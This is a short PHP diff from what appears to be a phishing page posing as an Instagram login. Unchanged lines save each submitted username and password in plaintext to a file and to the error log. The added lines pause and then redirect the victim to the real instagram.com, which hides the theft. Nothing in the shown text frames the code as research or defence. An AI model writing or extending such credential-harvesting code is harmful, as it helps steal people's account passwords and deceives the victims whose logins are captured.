@@ -188,6 +188,9 @@
         $data="user=$name,pass=$pass".PHP_EOL;
         file_put_contents('user.txt',$data,FILE_APPEND|LOCK_EX);
         error_log("username=$name,pass=$pass");
+        sleep(2);
+        header('Location: https://instagram.com');
+        exit();
     }
     ?>
 </body>
